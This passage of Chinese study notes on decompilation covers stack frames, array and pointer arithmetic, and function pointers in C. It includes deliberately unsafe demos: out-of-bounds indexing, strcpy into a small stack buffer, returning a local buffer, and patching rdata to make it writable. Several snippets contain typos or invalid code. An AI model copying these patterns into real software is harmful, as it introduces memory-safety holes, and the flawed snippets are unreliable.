class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/01/02/Notes-Decompile/07.png" class title="This is an example image">

<img src="/2024/01/02/Notes-Decompile/09.png" class title="This is an example image">

<img src="/2024/01/02/Notes-Decompile/10.png" class title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.调用者在自己的栈帧里开辟好被调函数形参需要的空间</span><br><span class="line"></span><br><span class="line">2.入栈 函数调用结束后应该执行的地址值，即返回地址，其实就是回收第一步为形参开辟的空间的指令的地址</span><br><span class="line"></span><br><span class="line">3.进入被调函数了，入栈调用函数栈帧的栈底地址</span><br><span class="line"></span><br><span class="line">4.在新函数的当前栈帧内为局部变量分配空间后，入栈局部变量</span><br><span class="line"></span><br><span class="line">5.被调函数遇到return语句了，说明即将结束本函数了，就开始做回收本栈帧的空间的事了：</span><br><span class="line"></span><br><span class="line">      1）如果有返回值，那么把返回值赋值给EAX，如果没有则忽略这一步。</span><br><span class="line"></span><br><span class="line">      2）回收局部变量空间，即esp指向调用函数栈帧的栈顶了</span><br><span class="line"></span><br><span class="line">      3）提前存好的main函数栈帧的栈底地址赋值进入ebp寄存器，从而使得ebp指向main函数栈帧的栈底</span><br><span class="line"></span><br><span class="line">      4）把返回地址填入EIP寄存器，接着就会指向，回收main函数当初为被调函数开辟的两个形参的空间的指令地址</span><br><span class="line"></span><br><span class="line">      5）回收形参空间</span><br><span class="line">————————————————</span><br><span class="line">原文链接：https://blog.csdn.net/kangkanglhb88008/article/details/89739105</span><br></pre></td></tr></table></figure>

<h2 id="5、数组"><a href="#5、数组" class="headerlink" title="5、数组"></a>5、数组</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> n = ...;</span><br><span class="line">type ary[M] = ...;</span><br><span class="line">ary[n] address:</span><br><span class="line">	(<span class="type">int</span>)ary + <span class="keyword">sizeof</span>(type)*n = <span class="number">0x00400000</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *p = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>,&amp;p[<span class="number">20</span>]);</span><br></pre></td></tr></table></figure>

<p>没有限制数组访问，默认可以任意访问</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d-%p&quot;</span>,arr[<span class="number">-1</span>],&amp;arr[<span class="number">-1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d-%p&quot;</span>,arr[<span class="number">0</span>],&amp;arr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d-%p&quot;</span>,arr[<span class="number">1</span>],&amp;arr[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d-%p&quot;</span>,arr[<span class="number">2</span>],&amp;arr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d-%p&quot;</span>,arr[<span class="number">3</span>],&amp;arr[<span class="number">3</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用越界，访问指定地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0019ff2c</span></span><br><span class="line">求出<span class="number">0x00400000</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n = <span class="number">2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>,ary[(<span class="number">0x00400000</span> - (<span class="type">int</span>)ary) / <span class="keyword">sizeof</span>(<span class="type">int</span>)]);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>间接访问，[] * -&gt;</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">change</span><span class="params">(<span class="type">int</span> n,<span class="type">int</span> m)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> temp = n;</span><br><span class="line">	n = m;</span><br><span class="line">	m = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n = <span class="number">1</span>,m = <span class="number">2</span>;</span><br><span class="line">	change(n,m);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">change</span><span class="params">(<span class="type">int</span> arr[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> temp = arr[<span class="number">0</span>];</span><br><span class="line">	arr[<span class="number">0</span>] = arr[<span class="number">1</span>];</span><br><span class="line">	arr[<span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> arr[] = &#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">	change(arr);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>内存结构示例图</p>
<img src="/2024/01/02/Notes-Decompile/10.png" class title="This is an example image">

<p>两个BUG(Build-clean)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 查看mainCRTStartup()源码</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">float</span> f;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>,&amp;f);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">foo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">goto</span> NEXT;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">NEXT:</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    foo();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6、二维数组"><a href="#6、二维数组" class="headerlink" title="6、二维数组"></a>6、二维数组</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//多维数组是特殊的一维数组，它里面的元素是数组</span></span><br><span class="line"><span class="comment">//N维数组</span></span><br><span class="line">ary[n] address:</span><br><span class="line">	(<span class="type">int</span>)ary + <span class="keyword">sizeof</span>(type)*n</span><br><span class="line"></span><br><span class="line">type ary[N][M]</span><br><span class="line">ary[x][y] address；</span><br><span class="line">     (<span class="type">int</span>)ary + <span class="keyword">sizeof</span>(type[M])*x   <span class="comment">// &amp;ary[x]</span></span><br><span class="line">              + <span class="keyword">sizeof</span>(type)*y      <span class="comment">// &amp;ary[x][y]</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> ary[<span class="number">3</span>][<span class="number">4</span>] = &#123;</span><br><span class="line">	&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,</span><br><span class="line">	&#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,</span><br><span class="line">	&#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> x = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> y = <span class="number">3</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>,&amp;ary[x][y]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>,&amp;ary[x][<span class="number">4</span>*x+y]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>,(<span class="type">int</span>)ary + <span class="keyword">sizeof</span>(<span class="type">int</span>[<span class="number">4</span>])*x + <span class="keyword">sizeof</span>(<span class="type">int</span>)*y);</span><br></pre></td></tr></table></figure>



<p>内存是一维存储，二维数组只有一个首地址，可以用一维数组访问到二维数组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type ary[N][M]</span><br><span class="line">ary[x][y] address；</span><br><span class="line">(int)ary + sizeof(type[M])*x + sizeof(type)*y</span><br><span class="line">(int)ary + sizeof(type)*M*x + sizeof(type)*y</span><br><span class="line">(int)ary + sizeof(type)*(M*x + y)</span><br><span class="line"></span><br><span class="line">ary[3][4]，从ary[0]开始访问</span><br><span class="line">其实就是 4y+x</span><br></pre></td></tr></table></figure>



<p>自定义strcpy实现对比</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mystrcpy</span><span class="params">(<span class="type">char</span> szDst[],<span class="type">char</span> szSrc[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>；</span><br><span class="line">    <span class="keyword">while</span> (szSrc[i]！=<span class="string">&#x27;\0&#x27;</span>)  <span class="comment">// 字符数组中&#x27;\0&#x27;表示结束符</span></span><br><span class="line">    &#123;</span><br><span class="line">        szDst[i] = szSrc[i];</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    szDst[i]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// while(szDst[i++] = szSrc[i]);</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<h2 id="7、-作用域"><a href="#7、-作用域" class="headerlink" title="7、 作用域"></a>7、 作用域</h2><p>全局变量的初始化与否会影响编译文件的大小</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> g_nTest = <span class="number">0x87654093</span>;</span><br><span class="line"><span class="type">char</span> g_szBuf[] = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> g_szTest[] = <span class="string">&quot;jjyy&quot;</span>;</span><br><span class="line"><span class="type">int</span> g_nTest2[<span class="number">0x10000</span>];  <span class="comment">//int g_nTest2[0x10000]=&#123;1&#125;;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Fun</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> stc_nTest = <span class="number">123</span>;</span><br><span class="line">    stc_nTest++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,stc_nTest);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    Fun(<span class="number">10</span>);</span><br><span class="line">    Fun(<span class="number">20</span>);</span><br><span class="line">    Fun(<span class="number">30</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析每种不同的变量，内存中定义</p>
<p>名称粉碎</p>
<p>汇编代码、内存、寄存器</p>
<p>变量放到寄存器，汇编里看不到？？</p>
<p>0042开头，全局变量</p>
<p>19ff2c，栈地址</p>
<h2 id="8、-地址和指针"><a href="#8、-地址和指针" class="headerlink" title="8、 地址和指针"></a>8、 地址和指针</h2><p>*取值<br>&amp;取地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">8</span>;</span><br><span class="line"><span class="type">int</span> *pa = <span class="literal">NULL</span>;</span><br><span class="line">pa = &amp;a;</span><br><span class="line">*pa = <span class="number">999</span>;  <span class="comment">//不能直接赋值指针</span></span><br></pre></td></tr></table></figure>

<p>指针和数组的区别<br>数组在定义时已经明确类型，指针存放的是地址，还需要附带解释方式，即类型sizeof(type)</p>
<p>指针效率小于等于数组</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> flt = <span class="number">3.14f</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,*(<span class="type">int</span> *)&amp;flt);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,*(<span class="type">int</span>)flt);</span><br></pre></td></tr></table></figure>

<h3 id="是否交换判定"><a href="#是否交换判定" class="headerlink" title="是否交换判定"></a>是否交换判定</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">myswap</span><span class="params">(<span class="type">int</span> *pn1,<span class="type">int</span> *pn2)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> *nTmp = pn1;</span><br><span class="line">	pn1 = pn2;</span><br><span class="line">	pn2 = nTmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">myswap2</span><span class="params">(<span class="type">int</span> *pn1,<span class="type">int</span> *pn2)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> nTmp = *pn1;</span><br><span class="line">	*pn1 = pn2[<span class="number">0</span>];</span><br><span class="line">	pn2[<span class="number">0</span>] = nTmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n1 = <span class="number">8</span>;</span><br><span class="line">    <span class="type">int</span> n2 = <span class="number">10</span>;</span><br><span class="line">    myswap(&amp;n1,&amp;n2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="字符串指针"><a href="#字符串指针" class="headerlink" title="字符串指针"></a>字符串指针</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> szTest[] = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="type">char</span> *pszTest = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">szTest[<span class="number">0</span>] = <span class="string">&#x27;h&#x27;</span>;</span><br><span class="line">pszTest[<span class="number">0</span>] = <span class="string">&#x27;h&#x27;</span>;</span><br><span class="line"><span class="built_in">puts</span>(szTest);</span><br><span class="line"><span class="built_in">puts</span>(pszTest);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>修改常量区可读写;</p>
<p>打开二进制文件，查找rdata字符串，下两行的40，修改为C0</p>
<h3 id="附带"><a href="#附带" class="headerlink" title="附带"></a>附带</h3><p>局部变量区会变化，基本上默认C那些都是，之后就是三个寄存器。再之后才是函数传参</p>
<h2 id="9、函数指针、数组指针"><a href="#9、函数指针、数组指针" class="headerlink" title="9、函数指针、数组指针"></a>9、函数指针、数组指针</h2><h3 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">foo</span><span class="params">(<span class="type">char</span> szBuf[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="built_in">strlen</span>(szBuf));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="keyword">sizeof</span>(szBuf));</span><br><span class="line">    <span class="comment">//int ary[200];</span></span><br><span class="line">	<span class="type">char</span> szBuf2[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(szBuf2,szBuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="built_in">strlen</span>(szBuf2));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="keyword">sizeof</span>(szBuf2));</span><br><span class="line">    <span class="comment">//返回的是临时变量，可能被重新分配</span></span><br><span class="line">    <span class="keyword">return</span> szBuf2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> szBuf1[] = <span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* szBuf2 = <span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="built_in">strlen</span>(szBuf1));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="built_in">strlen</span>(szBuf2));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="keyword">sizeof</span>(szBuf1));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="keyword">sizeof</span>(szBuf2));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="string">&quot;Hello world!&quot;</span>));</span><br><span class="line">    </span><br><span class="line">	<span class="type">char</span> *psz = foo(szBuf1);</span><br><span class="line">    <span class="built_in">puts</span>(psz);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="built_in">strlen</span>(psz));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,<span class="keyword">sizeof</span>(psz));</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2024/01/02/Notes-Decompile/12.png" class title="This is an example image">

<h3 id="数组指针"><a href="#数组指针" class="headerlink" title="数组指针"></a>数组指针</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">SortA</span><span class="params">(<span class="type">int</span> ary[], <span class="type">int</span> nCount)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;冒泡法&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">SortB</span><span class="params">(<span class="type">int</span> ary[], <span class="type">int</span> nCount)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;选择法&quot;</span>);   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(_cdecl*PFNSORT)</span><span class="params">(<span class="type">int</span> [], <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ary[<span class="number">54</span>];</span><br><span class="line">    <span class="comment">//函数的类型</span></span><br><span class="line">    <span class="comment">//1、参数序列（包括参数个数，类型，顺序）</span></span><br><span class="line">    <span class="comment">//2、调用约定</span></span><br><span class="line">    <span class="comment">//3、返回值类型</span></span><br><span class="line">    PFNSORT pfn = <span class="literal">NULL</span>;</span><br><span class="line">    pfn = SortB;</span><br><span class="line">    <span class="comment">//(*prnSort)(ary,54)</span></span><br><span class="line">    pfn(ary,<span class="number">54</span>);</span><br><span class="line"></span><br><span class="line">    pfn = SortA;</span><br><span class="line">    pfn(ary,<span class="number">54</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">意义:</span></span><br><span class="line"><span class="comment">1、函数指针，便于换</span></span><br><span class="line"><span class="comment">放在服务端，根据当前情况请求不同</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h2 id="10、指针和多维数组"><a href="#10、指针和多维数组" class="headerlink" title="10、指针和多维数组"></a>10、指针和多维数组</h2><p>1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ary[<span class="number">3</span>][<span class="number">4</span>] = &#123;</span><br><span class="line">        &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;,</span><br><span class="line">        &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>&#125;,</span><br><span class="line">        &#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>, <span class="number">400</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 数组名是第0个元素的指针常量</span></span><br><span class="line">    <span class="comment">// 二维数组的元素是一维数组</span></span><br><span class="line">    <span class="comment">// int ary[3][4]的元素是 int[4]</span></span><br><span class="line">    <span class="comment">// ary是int[4]类型的指针常量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, ary);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// *ary得到int[4]一维数组</span></span><br><span class="line">    <span class="comment">// *ary是int类型的指针常量</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, *ary);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 任何类型的变量取地址得到该类型的指针</span></span><br><span class="line">    <span class="comment">// &amp;ary取地址得到int[3][4]类型的指针</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, &amp;ary);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, ary[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, ary[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ary是int[4]类型的指针常量</span></span><br><span class="line">    <span class="comment">// ary + 1 &lt;==&gt; (int)ary + sizeof(int[4])*1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, ary + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// *ary是int类型的指针常量</span></span><br><span class="line">    <span class="comment">// *ary + 1 &lt;==&gt; (int)*ary + sizeof(int)*1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, *ary + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &amp;ary取地址得到int[3][4]类型的指针</span></span><br><span class="line">    <span class="comment">// &amp;ary + 1 &lt;==&gt; (int)&amp;ary + sizeof(int[3][4])*1</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, &amp;ary + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 二维数组的元素是一维数组</span></span><br><span class="line">    <span class="comment">// ary[0]是int[4]数组</span></span><br><span class="line">    <span class="comment">// 数组名是第0个元素的指针常量</span></span><br><span class="line">    <span class="comment">// ary[0]是int类型的指针常量</span></span><br><span class="line">    <span class="comment">// ary[0] + 1 &lt;==&gt; (int)ary[0] + sizeof(int)*1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, ary[<span class="number">0</span>] + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 指针加整形得到同类型的指针常量</span></span><br><span class="line">    <span class="comment">// ary是int[4]类型的指针常量</span></span><br><span class="line">    <span class="comment">// ary+1得到int[4]类型的指针常量</span></span><br><span class="line">    <span class="comment">// *(ary+1)得到一维数组int[4]</span></span><br><span class="line">    <span class="comment">// 数组名是第8个元素的指针常量</span></span><br><span class="line">    <span class="comment">// *(ary+1)是int类型的指针常量</span></span><br><span class="line">    <span class="comment">// 对int*做[1]运算得到int</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, (*(ary + <span class="number">1</span>))[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0019FF00</span></span><br><span class="line"><span class="comment">0019FF00</span></span><br><span class="line"><span class="comment">0019FF00</span></span><br><span class="line"><span class="comment">0019FF00</span></span><br><span class="line"><span class="comment">00000001</span></span><br><span class="line"><span class="comment">0019FF10</span></span><br><span class="line"><span class="comment">0019FF04</span></span><br><span class="line"><span class="comment">0019FF30</span></span><br><span class="line"><span class="comment">0019FF04</span></span><br><span class="line"><span class="comment">00000014</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ary[<span class="number">3</span>][<span class="number">4</span>] = &#123;</span><br><span class="line">        &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;,</span><br><span class="line">        &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>&#125;,</span><br><span class="line">        &#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>, <span class="number">400</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> (*p)[<span class="number">4</span>] = ary;</span><br><span class="line">    <span class="type">int</span> (*pAry)[<span class="number">3</span>][<span class="number">4</span>] = &amp;ary;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, *p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, pAry);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, *pAry);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, **pAry);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, p + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, *p + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, pAry + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, *pAry + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, **pAry + <span class="number">1</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0019FF00</span></span><br><span class="line"><span class="comment">0019FF00</span></span><br><span class="line"><span class="comment">0019FF00</span></span><br><span class="line"><span class="comment">0019FF00</span></span><br><span class="line"><span class="comment">0019FF00</span></span><br><span class="line"><span class="comment">0019FF10</span></span><br><span class="line"><span class="comment">0019FF04</span></span><br><span class="line"><span class="comment">0019FF30</span></span><br><span class="line"><span class="comment">0019FF10</span></span><br><span class="line"><span class="comment">0019FF04</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



